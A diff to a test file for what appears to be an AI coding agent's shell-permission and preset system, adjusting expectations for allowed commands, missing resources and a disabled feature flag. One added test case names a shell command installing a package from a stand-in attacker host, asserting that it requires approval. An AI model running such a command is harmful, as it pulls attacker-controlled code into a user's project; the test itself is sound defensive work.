@@ -238,10 +238,17 @@ test("reconciles a pending request only after every resource is granted", async 
       const covered = await client.permission.create({
         sessionID: session.id,
         action: "shell",
-        resources: ["bun install 2>&1", "tail -30"],
+        resources: ["bun install --frozen-lockfile 2>&1"],
         save: [],
       })
       expect(covered.effect).toBe("allow")
+      const added = await client.permission.create({
+        sessionID: session.id,
+        action: "shell",
+        resources: ["bun add https://evil.example/x.tgz"],
+        save: [],
+      })
+      expect(added.effect).toBe("ask")
       const write = await client.permission.create({
         sessionID: session.id,
         action: "shell",
@@ -255,8 +262,9 @@ test("reconciles a pending request only after every resource is granted", async 
         options,
       )
       expect(checked.presetID).toBe("dependency-install")
+      // Sets hold no output helpers; the agents' default rules allow `tail`, but `check` reports the set alone.
       expect(checked.results.map((result) => result.missing)).toEqual([
-        [],
+        ["tail -30"],
         ["bun install > /tmp/install.log"],
         ["git push"],
       ])
@@ -376,8 +384,8 @@ test("disables the offer and its mutations when the flag is off", async () => {
         const rpc = client.rpc(rpcDefinition)
         const location = { location: { directory } }
         expect(await rpc.list({}, location)).toMatchObject({ enabled: false, decision: "skipped", presets: [] })
-        expect(await rpc.reset({}, location)).toEqual({ removed: 0 })
-        expect(await rpc.list({}, location)).toMatchObject({ enabled: false, decision: null, presets: [] })
+        await expect(rpc.reset({}, location)).rejects.toMatchObject({ type: "unavailable" })
+        expect(await rpc.list({}, location)).toMatchObject({ enabled: false, decision: "skipped", presets: [] })
         await expect(rpc.apply({ presetID: "kilo-bun-checks" }, location)).rejects.toMatchObject({
           type: "unavailable",
         })
@@ -390,7 +398,7 @@ test("disables the offer and its mutations when the flag is off", async () => {
 
     await withServer({ database, directory: path.join(root, "config") }, async (client, ready) => {
       await ready(directory)
-      expect((await client.rpc(rpcDefinition).list({}, { location: { directory } })).decision).toBe(null)
+      expect((await client.rpc(rpcDefinition).list({}, { location: { directory } })).decision).toBe("skipped")
     })
   } finally {
     await rm(root, { recursive: true, force: true })
